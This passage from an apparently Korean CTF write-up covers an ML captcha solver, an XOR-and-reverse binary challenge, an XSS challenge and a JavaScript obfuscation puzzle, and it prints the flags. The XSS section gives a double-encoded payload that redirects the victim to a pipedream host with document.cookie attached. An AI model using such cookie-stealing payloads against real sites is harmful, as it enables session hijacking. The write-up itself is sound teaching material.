     <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
         <span class="n">category</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
         <span class="n">category</span> <span class="o">=</span> <span class="n">convert</span><span class="p">(</span><span class="n">category</span><span class="p">)</span>
         <span class="n">img_array</span> <span class="o">=</span> <span class="n">cv2</span><span class="p">.</span><span class="n">imread</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">path</span><span class="p">,</span><span class="n">p</span><span class="p">),</span><span class="n">cv2</span><span class="p">.</span><span class="n">IMREAD_GRAYSCALE</span><span class="p">)</span>
         <span class="n">new_img_array</span> <span class="o">=</span> <span class="n">cv2</span><span class="p">.</span><span class="n">resize</span><span class="p">(</span><span class="n">img_array</span><span class="p">,</span> <span class="n">dsize</span><span class="o">=</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
         <span class="n">X</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">new_img_array</span><span class="p">)</span>
         <span class="n">y</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">category</span><span class="p">)</span>

 <span class="c1"># preprocess the data
</span> <span class="n">preprocess</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
 <span class="n">X</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="n">array</span><span class="p">(</span><span class="n">X</span><span class="p">).</span><span class="n">reshape</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
 <span class="n">y</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="n">array</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>

 <span class="c1"># normalize data
</span> <span class="n">X</span> <span class="o">=</span> <span class="n">X</span><span class="o">/</span><span class="mf">255.0</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>모델 빌드 및 컴파일</p>

    <div class="language-python highlighter-rouge">
<div class="highlight"><pre class="highlight"><code> <span class="n">model</span> <span class="o">=</span> <span class="n">Sequential</span><span class="p">()</span>

 <span class="c1"># add a densely-connected layer with 64 units to the model:
</span> <span class="n">model</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">Conv2D</span><span class="p">(</span><span class="mi">64</span><span class="p">,(</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">),</span> <span class="n">activation</span> <span class="o">=</span> <span class="s">'relu'</span><span class="p">,</span> <span class="n">input_shape</span> <span class="o">=</span> <span class="n">X</span><span class="p">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">1</span><span class="p">:]))</span>
 <span class="n">model</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">MaxPooling2D</span><span class="p">(</span><span class="n">pool_size</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="p">)))</span>

 <span class="c1"># add another layer:
</span> <span class="n">model</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">Conv2D</span><span class="p">(</span><span class="mi">64</span><span class="p">,(</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">),</span> <span class="n">activation</span> <span class="o">=</span> <span class="s">'relu'</span><span class="p">))</span>
 <span class="n">model</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">MaxPooling2D</span><span class="p">(</span><span class="n">pool_size</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="p">)))</span>

 <span class="n">model</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">Flatten</span><span class="p">())</span>
 <span class="n">model</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">Dense</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="n">activation</span><span class="o">=</span><span class="s">'relu'</span><span class="p">))</span>

 <span class="c1"># add a softmax layer with 10 output units:
</span> <span class="n">model</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">Dense</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">activation</span><span class="o">=</span><span class="s">'sigmoid'</span><span class="p">))</span>

 <span class="n">model</span><span class="p">.</span><span class="nb">compile</span><span class="p">(</span><span class="n">optimizer</span><span class="o">=</span><span class="s">"adam"</span><span class="p">,</span>
               <span class="n">loss</span><span class="o">=</span><span class="s">'binary_crossentropy'</span><span class="p">,</span>
               <span class="n">metrics</span><span class="o">=</span><span class="p">[</span><span class="s">'accuracy'</span><span class="p">])</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>모델 학습</p>

    <div class="language-python highlighter-rouge">
<div class="highlight"><pre class="highlight"><code> <span class="n">model</span><span class="p">.</span><span class="n">fit</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">epochs</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">batch_size</span><span class="o">=</span><span class="mi">32</span><span class="p">,</span> <span class="n">validation_split</span><span class="o">=</span><span class="mf">0.2</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>이미지 예측</p>

    <div class="language-python highlighter-rouge">
<div class="highlight"><pre class="highlight"><code> <span class="n">cv2</span><span class="p">.</span><span class="n">imread</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">cv2</span><span class="p">.</span><span class="n">IMREAD_GRAYSCALE</span><span class="p">)</span>
 <span class="c1"># resize
</span> <span class="n">cv2</span><span class="p">.</span><span class="n">resize</span><span class="p">(</span><span class="n">img_array</span><span class="p">,</span> <span class="n">dsize</span><span class="o">=</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span><span class="mi">80</span><span class="p">))</span>
 <span class="c1"># reshape
</span> <span class="n">data</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="n">array</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="n">reshape</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
 <span class="c1"># normalize
</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">/</span><span class="mf">255.0</span>

 <span class="c1"># predict
</span> <span class="n">model</span><span class="p">.</span><span class="n">predict</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</code></pre></div>    </div>

    <p>이후, 학습한 모델을 이용해 문제 이미지를 실시간으로 받아오고 문제의 정답을 예측한 뒤 정답을 서버로 전송하면 된다.</p>
  </li>
</ol>

<h3 id="hashtable로-풀기">hashtable로 풀기</h3>

<p>소스코드에 나와있는 kaggle competition에 접속하여 주어진 데이터셋을 모두 다운로드 받은 다음 hash table 을 제작한다. 이후 문제 이미지에 해당하는 hash를 이용하여 문제의 정답을 구한다.</p>

<p><br></p>

<p><br></p>

<h2 id="verrox">
<a class="anchor" href="#verrox" aria-hidden="true"><span class="octicon octicon-link"></span></a>verrox</h2>

<hr>

<p><img src="/assets/bob/bob997.png" alt="/assets/bob/bob997.png"></p>

<p>description을 살펴보면 세상이 뒤집어진 것 같다는 말을 하고 있다.
verrox를 뒤집으면 xorrev이며, xor + rev라는 것을 유추할 수 있다.
해당 바이너리를 reverse한 후 8바이트 xor 키를 구해 연산하면 원본 ELF 파일이 나오게 되며, 실행 시 플래그를 얻을 수 있다.</p>

<h3 id="1-xor-key">1. xor key</h3>

<p><img src="/assets/bob/bob998.png" alt="/assets/bob/bob998.png"></p>

<ul>
  <li>바이너리를 hexdump, hxd 등으로 살펴보면 0x231f33f2aa2d7ed2가 상당히 많이 있는 것을 확인할 수 있다.</li>
  <li>8바이트 단위로 0x231f…가 반복되고 있기 때문에 8바이트 단위로 xor 연산을 했다고 볼 수 있다. 또한, elf 바이너리의 경우 null byte의 반복이 많기 때문에 xor key는 0x231f33f2aa2d7ed2로 가정할 수 있다.</li>
</ul>

<h3 id="2-풀이">2. 풀이</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#coding: utf-8
</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="n">data</span> <span class="o">=</span> <span class="s">b''</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"verrox"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"xorrev"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">key</span> <span class="o">=</span> <span class="s">b"</span><span class="se">\x23\x1f\x33\xf2\xaa\x2d\x7e\xd2</span><span class="s">"</span>
    <span class="n">res</span> <span class="o">=</span> <span class="s">b""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"B"</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="mi">8</span><span class="p">])</span>

    <span class="n">res</span> <span class="o">=</span> <span class="n">res</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/bob/bob999.png" alt="/assets/bob/bob999.png"></p>

<ul>
  <li>해당 xor key를 이용하여 8바이트 단위로 xor연산 후 reverse 해주게 되면 원본 바이너리를 획득할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob9100.png" alt="/assets/bob/bob9100.png"></p>

<ul>
  <li>얻어낸 바이너리를 실행하면 플래그를 얻을 수 있다.</li>
  <li>FLAG : bob{royal_macaron_is_very_tasty_you_know?}</li>
</ul>

   
   <h1 id="️-web">🖥️ WEB</h1>

<h2 id="last-of-cat">Last of cat</h2>

<p><img src="/assets/bob/bob9Untitled.png" alt="/assets/bob/bob9Untitled.png" /></p>

<p><img src="/assets/bob/bob91.png" alt="/assets/bob/bob91.png" /></p>

<ul>
  <li><code class="highlighter-rouge">Last of Cat</code>  페이지에 접속하면 <code class="highlighter-rouge">Login Page</code>가 출력됩니다.  회원가입을 하기 위해 <code class="highlighter-rouge">Join</code> 버튼을 클릭한다.</li>
</ul>

<p><img src="/assets/bob/bob92.png" alt="/assets/bob/bob92.png" /></p>

<ul>
  <li>회원가입하고 로그인을 하여 메뉴를 확인한다.</li>
</ul>

<p><img src="/assets/bob/bob93.png" alt="/assets/bob/bob93.png" /></p>

<ul>
  <li><code class="highlighter-rouge">Cat</code>메뉴에서는 고양이 사진을 확인할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob94.png" alt="/assets/bob/bob94.png" /></p>

<ul>
  <li><code class="highlighter-rouge">Bot</code> 에서는 <code class="highlighter-rouge">Input URL</code> 기능을 통해 봇에게 XSS 구문을 전송할 수 있다. 아래 <code class="highlighter-rouge">Bot Log</code>  테이블에서 봇이 내 URL을 확인했는지 바로 확인이 가능하다.</li>
</ul>

<blockquote>
  <p>이 문제는 XSS가 발생하는 페이지를 찾아 해당 페이지를 통해 <strong>쿠키를 탈취하는 스크립트를 작성하면 풀리는</strong> 간단한 문제다.</p>
</blockquote>

<p><img src="/assets/bob/bob95.png" alt="/assets/bob/bob95.png" /></p>

<ul>
  <li>Cat Page에 접속하면 위 화면과 같은 고양이 사진과 문구가 출력된다.</li>
  <li>사진과 문구를 출력하는 루틴을 살펴보면, src 파라미터를 통해 html을 읽어온다. 해당 기능을 이용하여 XSS를 발생시킬 수 있다.</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://bob.zairo.kr:1337/catview?**src=http://bob.zairo.kr:1337/cats/ae7d0baaa9b7ad791a6bfa53c936490e.html**
</code></pre></div></div>

<p><img src="/assets/bob/bob96.png" alt="/assets/bob/bob96.png" /></p>

<p><img src="/assets/bob/bob97.png" alt="/assets/bob/bob97.png" /></p>

<ul>
  <li><code class="highlighter-rouge">Cat</code> 페이지에서  <code class="highlighter-rouge">View</code> 버튼을 클릭할때를 Fiddler로 살펴보면 <code class="highlighter-rouge">getlink</code> 페이지에 <code class="highlighter-rouge">idx=숫자</code> 형식으로 페이지를 요청하는것을 확인할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob98.png" alt="/assets/bob/bob98.png" /></p>

<ul>
  <li><code class="highlighter-rouge">/getlink?idx=2</code> 에 접속하면 위와 같이 idx와 link가 출력된다.</li>
</ul>

<p><img src="/assets/bob/bob99.png" alt="/assets/bob/bob99.png" /></p>

<ul>
  <li>getlink 페이지에 임의 값을 입력할 경우 그대로 출력해주는데 해당 페이지의 응답의 <code class="highlighter-rouge">Content-Type</code> 은 <code class="highlighter-rouge">application/json</code>이라 스크립트가 실행되지 않는다. 하지만, 특정 페이지를 로드시켜 페이지 내부에 포함하는 경우 해당 페이지를 이용하여 XSS를 발생시킬 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob910.png" alt="/assets/bob/bob910.png" /></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[http://bob.zairo.kr:1337/catview?src=**http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D](http://bob.zairo.kr:1337/catview?src=http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D%253Cscript%253Ealert(1)%253C%252Fscript%253E)%253Cscript%253Ealert(1)%253C%252Fscript%253E**
</code></pre></div></div>

<ul>
  <li><code class="highlighter-rouge">src</code>에 getlink 페이지 idx 파라미터 값에 <code class="highlighter-rouge">[&lt;script&gt;alert(1);&lt;/script&gt;](http://bob.zairo.kr:1337/getlink?idx=&lt;script&gt;alert(1)&lt;/script&gt;)</code> 를 2번 URL Encoding 하여 입력하면 그림과 같이 alert 구문이 실행되는 것을 확인할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob911.png" alt="/assets/bob/bob911.png" /></p>

<ul>
  <li><code class="highlighter-rouge">request bin</code>을 이용해 임의 서버로 쿠키를 전송하도록 하여 탈취하도록 한다</li>
</ul>

<p><img src="/assets/bob/bob912.png" alt="/assets/bob/bob912.png" /></p>

<p><strong>Payload</strong></p>

<blockquote>
  <p><a href="http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http%253A%252F%252Fbob.zairo.kr%253A1337%252Fgetlink%253Fidx%253D%253Cscript%253Edocument.location.href%253D%2527https%253A%252F%252Fenwm946jeqwe.x.pipedream.net%252F%253Fparam%2527%252Bdocument.cookie%253C%252Fscript%253E">http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D%3Cscript%3Edocument.location.href%3D%27https%3A%2F%2Fenwm946jeqwe.x.pipedream.net%2F%3Fparam%27%2Bdocument.cookie%3C%2Fscript%3E</a></p>
</blockquote>

<blockquote>
  <p><a href="http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http://bob.zairo.kr:1337/getlink?idx=">http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http://bob.zairo.kr:1337/getlink?idx=</a><strong>&lt;script&gt;document.location.href=’<a href="https://enwm946jeqwe.x.pipedream.net/?param">https://enwm946jeqwe.x.pipedream.net/?param</a>’+ document.cookie&lt;/script&gt;</strong></p>
</blockquote>

<ul>
  <li>위 구문을 통해 <code class="highlighter-rouge">catview</code> 페이지에서 <code class="highlighter-rouge">src</code> 파라미터로 값을 처리할 때 <code class="highlighter-rouge">getlink</code> 페이지에 접속하고 <code class="highlighter-rouge">getlink</code> 페이지의 <code class="highlighter-rouge">idx</code>에 입력 되어 있는 스크립트 구문이 실행되어 결국 쿠키를 탈취 할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob913.png" alt="/assets/bob/bob913.png" /></p>

<p><br /></p>

<p><br /></p>

<h2 id="king-musae">King musae</h2>

<hr />

<p><img src="/assets/bob/bob914.png" alt="/assets/bob/bob914.png" /></p>

<p>[Javasciprt 난독화]
해당 문제는 Javascript 난독화이며, 간단하게 플래그가 숨겨져 있는 문제임
(본 문제는 <a href="https://m.blog.naver.com/chiot_aile/221592247073">로얄 마카롱 앵무새</a>가 생각나서 만들게 되었으며,  라온에 놀러오시면 꼭 여기 마카롱집 가야됩니다.)</p>

<p>풀이는 어렵지 않으며, 간단하다. 별다른 안티 디버깅 및 복잡한 난독화가 아닌 단순히 플래그가 출력되지 못하도록 변수에 저장되어있는 걸 찾는 문제임</p>

<h3 id="1-문제-파악하기">1. 문제 파악하기</h3>

<ul>
  <li>문제 사이트에 접속하면 Javascript Alert로 “<strong>find Flag</strong>“를 출력된다.</li>
</ul>

<p><img src="/assets/bob/bob915.png" alt="/assets/bob/bob915.png" /></p>

<ul>
  <li>Chrome 개발자 도구인 소스코드 보기를 눌러 자바스크립트 코드를 확인해보면 아래와 같이 난독화된 자바스크립트 코드를 확인할 수 있다.</li>
</ul>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">𓆓</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">{}</span><span class="dl">"</span><span class="p">,</span><span class="err">𓅧</span><span class="o">=</span><span class="dl">''</span><span class="p">,</span><span class="err">𓃟</span><span class="o">=</span><span class="dl">'</span><span class="s1">@</span><span class="dl">'</span><span class="p">,</span><span class="err">𓅀</span><span class="o">=</span><span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">,</span><span class="err">𓅂</span><span class="o">=</span><span class="dl">''</span><span class="p">,</span><span class="err">𓊎</span><span class="o">=</span><span class="err">𓅂</span><span class="o">+</span><span class="p">{},</span><span class="err">𓆂</span> <span class="o">=</span> <span class="dl">''</span><span class="p">,</span><span class="err">𓇎</span><span class="o">=</span><span class="err">𓅂</span><span class="p">,</span><span class="err">𓅿</span> <span class="o">=</span> <span class="err">𓅂</span><span class="o">+</span><span class="err">𓅂</span><span class="p">[[]],</span><span class="err">𓆟</span><span class="o">=</span><span class="err">𓅂</span><span class="p">,</span><span class="o">++</span><span class="err">𓇎</span><span class="p">,</span><span class="err">𓆟</span><span class="o">=</span><span class="err">𓊎</span><span class="p">[</span><span class="o">++</span><span class="err">𓇎</span><span class="p">],</span><span class="o">++</span><span class="err">𓆂</span><span class="p">,</span><span class="o">++</span><span class="err">𓆂</span><span class="p">,</span><span class="o">++</span><span class="err">𓆂</span><span class="p">,</span><span class="err">𓆟</span><span class="o">+=</span><span class="err">𓊎</span><span class="p">[</span><span class="o">--</span><span class="err">𓇎</span><span class="p">],</span><span class="o">++</span><span class="err">𓆂</span><span class="p">,</span><span class="err">𓆟</span><span class="o">+=</span><span class="err">𓊎</span><span class="p">[</span><span class="o">++</span><span class="err">𓇎</span><span class="p">],</span><span class="err">𓆟</span><span class="o">+=</span><span class="err">𓆓</span><span class="p">[</span><span class="err">𓅧</span><span class="o">++</span><span class="p">],</span><span class="err">𓄧</span><span class="o">=</span><span class="err">𓊎</span><span class="p">,</span><span class="o">--</span><span class="err">𓇎</span><span class="p">,</span><span class="o">--</span><span class="err">𓇎</span><span class="p">,</span><span class="err">𓆲</span><span class="o">=</span><span class="err">𓅿</span><span class="p">[</span><span class="err">𓆂</span><span class="o">++</span><span class="p">],</span> <span class="err">𓆲</span><span class="o">+=</span><span class="err">𓅿</span><span class="p">[</span><span class="err">𓆂</span><span class="o">++</span><span class="p">],</span><span class="err">𓆲</span><span class="o">+=</span><span class="err">𓅿</span><span class="p">[</span><span class="err">𓆂</span><span class="o">++</span><span class="p">],</span><span class="o">++</span><span class="err">𓆂</span><span class="p">,</span><span class="err">𓆲</span><span class="o">+=</span><span class="err">𓅿</span><span class="p">[</span><span class="err">𓆂</span><span class="o">++</span><span class="p">],</span><span class="err">𓂀</span><span class="o">=!</span><span class="err">𓅂</span><span class="o">+</span><span class="err">𓅂</span><span class="p">,</span><span class="err">𓁄</span><span class="o">=!</span><span class="err">𓂀</span><span class="o">+</span><span class="err">𓅂</span><span class="p">,</span><span class="o">++</span><span class="err">𓇎</span><span class="p">,</span><span class="err">𓅧</span><span class="p">,</span><span class="err">𓆣</span><span class="o">=</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓅂</span><span class="o">++</span><span class="p">],</span><span class="err">𓊝</span><span class="o">=</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓇎</span><span class="o">=</span><span class="err">𓅂</span><span class="p">],</span><span class="err">𓆂</span><span class="o">--</span><span class="p">,</span><span class="o">--</span><span class="err">𓆂</span><span class="p">,</span><span class="err">𓆌</span><span class="o">=</span><span class="err">𓊝</span><span class="o">+</span><span class="err">𓃟</span><span class="o">+</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span><span class="o">+</span><span class="err">𓅿</span><span class="p">[</span><span class="o">--</span><span class="err">𓆂</span><span class="p">],</span><span class="err">𓏢</span><span class="o">=++</span><span class="err">𓇎</span><span class="o">+</span><span class="err">𓅂</span><span class="p">,</span><span class="err">𓆗</span><span class="o">=</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓇎</span><span class="o">+</span><span class="err">𓏢</span><span class="p">],</span><span class="err">𓆌</span><span class="o">+=</span><span class="err">𓆓</span><span class="p">[</span><span class="err">𓅧</span><span class="p">],</span><span class="err">𓆓</span><span class="p">[</span><span class="err">𓆡</span><span class="o">=</span><span class="err">𓆟</span><span class="o">+</span><span class="err">𓄧</span><span class="o">+</span><span class="err">𓆌</span><span class="p">],</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓆗</span><span class="o">+=</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="p">(</span><span class="err">𓂀</span><span class="p">.</span><span class="err">𓁄</span><span class="o">+</span><span class="err">𓊎</span><span class="p">)[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span><span class="err">𓊝</span><span class="o">+</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span><span class="o">+</span><span class="err">𓆗</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓊝</span><span class="p">][</span><span class="err">𓆗</span><span class="p">](</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span><span class="o">+</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span><span class="o">+</span><span class="err">𓊝</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span><span class="dl">"</span><span class="s2">('</span><span class="dl">"</span><span class="o">+</span><span class="err">𓆲</span><span class="o">+</span><span class="dl">"</span><span class="s2"> Flag')</span><span class="dl">"</span><span class="p">)</span><span class="s2">``</span>
</code></pre></div></div>

<ul>
  <li>우선 난독화된 자바스크립트를 파악하기 전 “alert” 문자열 없이 alert가 실행된 건 알 수 있으며,  해당 코드가 어떻게 실행되었는지 “<strong>`</strong>” 벡터를 제거하여 난독화된 자바스크립트가 실행되지 않도록 chrome console에 넣어보면 아래와 같이 코드가 구현되어 있는 걸 알 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob916.png" alt="/assets/bob/bob916.png" /></p>

<ul>
  <li>하지만 변수에 저장된 Flag는 알 수 없었지만 난독화된 코드를 통하여 alert가 실행된건 알 수 있다.</li>
</ul>

<p>보다 쉬운 예제는 “<a href="https://twitter.com/aemkei/status/1262872762621837314">Martin Kleppe</a>“가 작성한 코드를 보면 더 쉽게 알 수 있다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="err">𓀀</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">𓅂</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">function</span> <span class="err">𓆣</span><span class="p">(</span><span class="err">𓂀</span><span class="p">){</span> <span class="nx">alert</span><span class="p">(</span><span class="err">𓂀</span><span class="p">);</span> <span class="p">}</span>
<span class="err">𓆣</span><span class="p">(</span><span class="err">𓀀</span><span class="p">);</span>
</code></pre></div></div>

<p>[Martin Kleppe의 special characters]</p>

<p>위 코드를 브라우저에서 실행되면 새가 출력되는걸 볼 수 있으며, 위 코드를 하나씩 설명하면</p>

<p>먼저 “<strong>𓀀</strong>” 변수에 싱글 쿼터로 문자열로 만들어 ‘<strong>𓅂</strong>’ 새를 저장한다.</p>

<p>그리고 사용자 정의 함수를 만드는 과정에서 함수 이름 대신 “𓆣” 장수 풍댕이로 선언하고 인자명 대신 “𓂀” 나뭇잎을 선언하고 내부 로직은 alert를 통하여 전달된 인자(나뭇잎)를 통하여 출력되는 로직이다.</p>

<p>그러므로 최종적으로 장수 풍댕이(함수)를 새가 저장된 “<strong>𓀀”</strong>변수를 인자로 전달하여 결국엔 새가 출력되는 로직이다. <em>**</em>여기까지 이해가 되었다면 아래 예제에서 난독화에 대해 좀더 알아보도록 하자.</p>

<h3 id="2-로직-파악하기">2. 로직 파악하기</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">𓅂</span><span class="o">=</span><span class="dl">''</span>             <span class="c1">//    ""</span>
<span class="err">𓂀</span><span class="o">=!</span><span class="err">𓅂</span><span class="o">+</span><span class="err">𓅂</span>        <span class="c1">//    "true"</span>
<span class="err">𓁄</span><span class="o">=!</span><span class="err">𓂀</span><span class="o">+</span><span class="err">𓅂</span>         <span class="c1">//    "false"</span>
<span class="err">𓊎</span><span class="o">=</span><span class="err">𓅂</span><span class="o">+</span><span class="p">{}</span>          <span class="c1">//    "[object Object]"</span>

<span class="err">𓆣</span><span class="o">=</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓅂</span><span class="o">++</span><span class="p">]</span>        <span class="c1">//   "r" (𓅂 = 2)</span>
<span class="err">𓊝</span><span class="o">=</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓇎</span><span class="o">=</span><span class="err">𓅂</span><span class="p">]</span>       <span class="c1">//   "u" (𓇎  = 2)</span>
<span class="err">𓏢</span><span class="o">=++</span><span class="err">𓇎</span><span class="o">+</span><span class="err">𓅂</span>          <span class="c1">//    5  (𓇎 = 3), (𓇎3 + 𓅂2)</span>
<span class="err">𓆗</span><span class="o">=</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓇎</span><span class="o">+</span><span class="err">𓏢</span><span class="p">]</span>         <span class="c1">//    "O"</span>

<span class="err">𓂀</span>                 <span class="c1">//   "true"</span>
<span class="err">𓆗</span><span class="o">+=</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span>         <span class="c1">//   "co"</span>
<span class="p">(</span><span class="err">𓂀</span><span class="p">.</span><span class="err">𓁄</span><span class="o">+</span><span class="err">𓊎</span><span class="p">)[</span><span class="err">𓅂</span><span class="p">]</span>    <span class="c1">//    "n"</span>
<span class="err">𓁄</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span>              <span class="c1">//   "s"</span>
<span class="err">𓆣</span>                 <span class="c1">//   "t"</span>
<span class="err">𓊝</span>                 <span class="c1">//   "r"</span>
<span class="err">𓊎</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span>            <span class="c1">//   "o"</span>
<span class="err">𓊝</span>                <span class="c1">//    "r"</span>
<span class="err">𓆗</span>                 <span class="c1">//   "constructor"</span>

<span class="err">𓂀</span><span class="p">[</span><span class="err">𓆗</span><span class="o">+=</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="p">(</span><span class="err">𓂀</span><span class="p">.</span><span class="err">𓁄</span><span class="o">+</span><span class="err">𓊎</span><span class="p">)[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span>
<span class="err">𓊝</span><span class="o">+</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span><span class="o">+</span><span class="err">𓆗</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓊝</span><span class="p">][</span><span class="err">𓆗</span><span class="p">]</span>
<span class="c1">//   ƒ Function() { [native code] }</span>

<span class="err">𓁄</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span>             <span class="c1">//   "a"</span>
